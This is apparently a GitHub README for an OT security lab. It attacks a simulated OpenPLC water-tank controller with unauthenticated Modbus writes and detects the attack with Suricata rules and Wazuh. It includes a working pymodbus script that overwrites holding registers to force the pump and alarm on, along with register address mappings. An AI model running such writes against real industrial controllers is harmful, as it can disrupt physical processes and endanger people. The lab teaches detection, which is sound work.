# OT Attack & Detection Lab — OpenPLC + Kali Linux + Suricata + Wazuh

## Overview

This project simulates a real-world OT (Operational Technology) attack on a water treatment plant PLC. An unauthorized Modbus TCP write attack is launched from Kali Linux to manipulate PLC registers, forcing the pump and alarm to activate. The attack is detected using Suricata IDS and monitored through Wazuh SIEM, with findings mapped to the MITRE ATT&CK for ICS framework.

The project demonstrates the fundamental vulnerability in the Modbus protocol: **zero authentication**. Any device on the network can send write commands to a PLC without any password or authorization — the same vulnerability exploited in real-world incidents such as the Triton malware attack and the Ukraine power grid attack.

---

## Lab Architecture

| Component | Details |
|-----------|---------|
| **Ubuntu VM** | 192.168.71.128 — OpenPLC Runtime, Suricata IDS, Wazuh SIEM |
| **Kali VM** | 192.168.71.129 — Attacker Machine |
| **Virtualization** | VMware Workstation — NAT Network |
| **Protocol** | Modbus TCP — Port 502 |

![Lab Setup](screenshots/Screenshot%202026-07-22%20211109.png)

---

## Water Tank Scenario

A water treatment plant is simulated with three sensors and two outputs:

| Variable | Type | PLC Address | Modbus Address | Role |
|----------|------|-------------|----------------|------|
| low_level | WORD | %MW0 | 1024 | Tank bottom sensor |
| high_level | WORD | %MW1 | 1025 | Tank 80% sensor |
| alarm_level | WORD | %MW2 | 1026 | Overflow sensor |
| pump | BOOL | %QX0.0 | Coil 0 | Inlet valve |
| alarm | BOOL | %QX0.1 | Coil 1 | Buzzer/Alert |

### Ladder Logic Design

![Ladder Logic](screenshots/Screenshot%202026-07-26%20114810.png)

### PLC Program (Structured Text)

```pascal
PROGRAM water_tank
  VAR
    low_level AT %MW0 : WORD;
    high_level AT %MW1 : WORD;
    alarm_level AT %MW2 : WORD;
    pump AT %QX0.0 : BOOL;
    alarm AT %QX0.1 : BOOL;
  END_VAR

  pump := (low_level > 0);
  alarm := (alarm_level > 0);

END_PROGRAM
```

### OpenPLC Compilation & Runtime

![Compile Success](screenshots/Screenshot%202026-07-26%20124711.png)

![OpenPLC Running](screenshots/Screenshot%202026-07-26%20125224.png)

---

## Modbus Address Mapping

OpenPLC maps `%MW` variables starting at Modbus address **1024**, not 0. This was a critical discovery during the project.

```
%MW0 → Modbus Address 1024
%MW1 → Modbus Address 1025
%MW2 → Modbus Address 1026
```

![LOCATED_VARIABLES.h Confirmation](screenshots/Screenshot%202026-07-27%20081541.png)

---

## Attack Simulation

### Attack Script (Kali Linux)

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("192.168.71.128", port=502)
if client.connect():
    before = client.read_holding_registers(address=1024, count=3)
    print("Before attack:", before.registers)

    client.write_register(address=1024, value=1)   # %MW0 = low_level
    client.write_register(address=1026, value=1)   # %MW2 = alarm_level

    after = client.read_holding_registers(address=1024, count=3)
    print("After attack:", after.registers)
    client.close()
```

### Before Attack — Baseline

![Before Attack](screenshots/Screenshot%202026-07-27%20144035.png)

### Attack Execution

![Attack Output](screenshots/Screenshot%202026-07-27%20153325.png)

### After Attack — PLC Compromised

![Attack Success](screenshots/Screenshot%202026-07-29%20125213.png)

**Result:** `low_level = 1`, `alarm_level = 1`, `pump = TRUE`, `alarm = TRUE` — PLC successfully hijacked without any authentication.

---

## Wireshark Analysis

Network traffic captured on port 502 shows the complete attack lifecycle:

| Packet | Description |
|--------|-------------|
| 223-225 | TCP 3-way handshake (SYN, SYN-ACK, ACK) |
| 226 | Modbus Read Query — Before attack check |
| 232 | Modbus Read Response — `[0, 0, 0]` |
| 234 | **Modbus Write FC6 — %MW0 = 1 (ATTACK #1)** |
| 237 | **Modbus Write FC6 — %MW2 = 1 (ATTACK #2)** |
| 239 | Modbus Read Query — Verification |
| 240 | Modbus Read Response — `[1, 0, 1]` (Confirmed) |
| 241-243 | TCP FIN-ACK — Connection closed |

![Wireshark Packet List](screenshots/Screenshot%202026-07-28%20055727.png)

![Wireshark FC6 Detail](screenshots/Screenshot%202026-07-28%20055504.png)

---

## Suricata IDS Detection

Custom Suricata rules detect unauthorized Modbus write commands based on Function Code analysis:

```
pass tcp 192.168.71.128 any -> 192.168.71.128 502 (msg:"Authorized local Modbus"; sid:1000000; rev:1;)
alert tcp any any -> 192.168.71.128 502 (msg:"Unauthorized Modbus Write FC6"; content:"|06|"; offset:7; depth:1; sid:1000001; rev:2;)
alert tcp any any -> 192.168.71.128 502 (msg:"Unauthorized Modbus Write FC16"; content:"|10|"; offset:7; depth:1; sid:1000002; rev:2;)
```

- **Pass rule** allows authorized local PLC traffic
- **Alert rules** detect Function Code 6 (Write Single Register) and Function Code 16 (Write Multiple Registers) from any unauthorized source

![Suricata FC6 Alert](screenshots/Screenshot%202026-07-29%20161209.png)

---

## Wazuh SIEM Integration

Suricata alerts are forwarded to Wazuh SIEM through `eve.json` integration. A custom Wazuh rule maps alerts to MITRE ATT&CK for ICS techniques:

```xml
<group name="ot_attack,">
  <rule id="100050" level="13">
    <if_sid>86601</if_sid>
    <description>OT Attack: Unauthorized Modbus Write on PLC</description>
    <mitre>
      <id>T0846</id>
      <id>T0831</id>
      <id>T0826</id>
    </mitre>
  </rule>
</group>
```

### Detection Flow

```
Kali Attack (Modbus Write FC6)
        ↓
Suricata detects (modbus.rules)
        ↓
Alert written to eve.json
        ↓
Wazuh reads eve.json (ossec.conf)
        ↓
Built-in Rule 86601 triggers
        ↓
Custom Rule 100050 triggers (MITRE IDs)
        ↓
Dashboard Alert
```

![Wazuh Overview](screenshots/Screenshot%202026-07-28%20144004.png)

![Wazuh Custom Rule — MITRE Badge](screenshots/Screenshot%202026-07-29%20073838.png)

![Wazuh Alert Detail — FC6](screenshots/Screenshot%202026-07-29%20161802.png)

![Wazuh Dashboard — All Alerts](screenshots/Screenshot%202026-07-29%20201126.png)

---

## MITRE ATT&CK for ICS Mapping

| Tactic | ID | Technique | Evidence |
|--------|-----|-----------|----------|
| Discovery | T0846 | Remote System Discovery | PLC identified at 192.168.71.128:502 |
| Evasion | T1692.001 | Unauthorized Command Message | Modbus write commands sent without authentication |
| Impact | T0831 | Manipulation of Control | %MW0 and %MW2 tag values modified, forcing pump activation |
| Impact | T0826 | Loss of Availability | Pump forcefully activated — tank overflow scenario |

---

## Key Findings

1. **Modbus has zero authentication** — any device on the network can write to PLC registers without credentials
2. **OpenPLC maps %MW variables to Modbus address 1024+**, not address 0 — understanding vendor-specific mappings is critical for OT security assessments
3. **Suricata can detect Modbus attacks** by inspecting Function Codes at the packet level
4. **Wazuh SIEM integrates with Suricata** through eve.json, enabling centralized alert management with MITRE ATT&CK mapping
5. **Pass rules in Suricata** effectively whitelist authorized traffic while alerting on unauthorized sources

---

## Tools Used

| Tool | Purpose |
|------|---------|
| OpenPLC | PLC simulation — water tank control program |
| Kali Linux | Attack platform — pymodbus for Modbus write |
| Wireshark | Network traffic analysis — PCAP evidence |
| Suricata | IDS — real-time Modbus Function Code detection |
| Wazuh | SIEM — centralized alerting with MITRE mapping |
| VMware | Lab virtualization — isolated network |

---

## How to Reproduce

1. Set up Ubuntu VM with OpenPLC Runtime on port 502
2. Set up Kali VM on the same network
3. Upload and compile the water tank ST program in OpenPLC
4. Install Suricata with custom Modbus detection rules
5. Install Wazuh SIEM and configure eve.json integration
6. Run `attack.py` from Kali
7. Observe alerts in Suricata fast.log and Wazuh dashboard

---

## Author

**Sheheryar Altaf**
[GitHub](https://github.com/sheheryaraltaf) | [LinkedIn](https://linkedin.com/in/sheheryaraltaf)
